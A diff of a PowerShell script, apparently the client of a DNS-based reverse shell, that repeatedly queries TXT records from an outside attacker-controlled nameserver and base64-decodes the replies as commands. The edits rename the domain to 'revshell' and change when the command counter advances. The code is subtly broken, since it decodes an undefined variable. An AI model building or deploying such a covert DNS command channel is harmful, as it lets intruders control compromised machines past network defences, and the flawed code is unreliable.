@@ -1,4 +1,4 @@
-$domain = "dnshell.programm.zip"
+$domain = "revshell.dnshell.programm.zip"
 $code = "123"
 
 # Request TXT record from DNS server
@@ -6,15 +6,15 @@ $commandcount = 0
 $stop = $false
 while(!$stop){
     Write-Host "Request to: $commandcount.$code.$domain"
-    $dnsResult = Resolve-DnsName -Name "$commandcount.$code.$domain" -Server ns.programm.zip -Type TXT
+    $dnsResult = Resolve-DnsName -Name "$commandcount.$code.$domain" -Server ns.programm.zip -Type TXT -DnsOnly
     if ($dnsResult) {
         $decodedResponse = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response.Substring(0, $response.Length - 9)))
         Write-Output $decodedResponse
+        $commandcount++
     }
     else{
         
     }
-    $commandcount++
     Start-Sleep -Seconds 2
 }
 
